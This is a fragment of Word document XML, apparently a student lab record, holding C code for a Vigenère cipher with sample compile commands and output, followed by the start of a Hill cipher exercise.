    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w: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1262" w:space="256"/>
            <w:col w:w="7562"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2228" w:right="419"/>
      </w:pPr>
      <w:r>
        <w:t>keyword[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=keyword[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">]; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e keyword </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze of p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>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0"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>coun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)</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nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;cou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>= p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]+keyword[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;130|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>&gt;180)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nput</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n CA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>S on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(0);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]= (sum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>% 26) + 65;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</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00"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId12">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gcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bensv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gnere.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId13">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>a.o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="100" w:right="2780"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>AR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>DISCOV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>DS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-33"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>YOURS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>EL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">F </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he keyword :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>IVE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3441"/>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:t>ICV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>WQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>GR</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:t>GV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-26"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-31"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:t>HCCM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>EZ</w:t>
      </w:r>
      <w:r>
        <w:t>IPY</w:t>
      </w:r>
      <w:hyperlink r:id="rId14">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pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="134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080" w:right="715" w:hanging="3980"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 4                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ILL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
